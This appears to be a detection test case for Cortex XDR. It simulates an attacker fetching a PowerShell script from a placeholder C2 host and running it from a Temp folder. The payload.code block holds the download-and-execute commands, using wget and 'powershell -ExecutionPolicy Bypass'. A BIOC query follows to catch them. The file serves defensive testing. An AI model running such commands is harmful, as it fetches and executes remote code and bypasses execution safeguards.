identity.summary: An attacker downloads a PowerShell script from a remote C2 server and executes it from a temporary directory. Cortex should detect the execution of PowerShell from a non-standard location and flag it
identity.description: An attacker downloads a PowerShell script from a remote C2 server and executes it from a temporary directory. Cortex should detect the execution of PowerShell from a non-standard location and flag it as suspicious behavior.

payload.code:
mkdir C:\Windows\Temp\test
wget https://example.com/malicious.ps1 -OutFile C:\Windows\Temp\test\script.ps1
powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\test\script.ps1

expected_artifacts.description: PowerShell process started from a temporary directory
PowerShell script downloaded to a temporary directory
expected_artifacts.expected_value: action_file_path contains 'Temp' and action_file_path ends with '.ps1'

expected_artifacts.description: Connection to C2 server from temporary directory

biocs.name: PowerShell Execution from Temp Directory
biocs.description: Detection of PowerShell process started from a temporary directory
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe' and action_file_path contains 'Temp'

xql_queries.name: PowerShell from Temp Directory Hunt
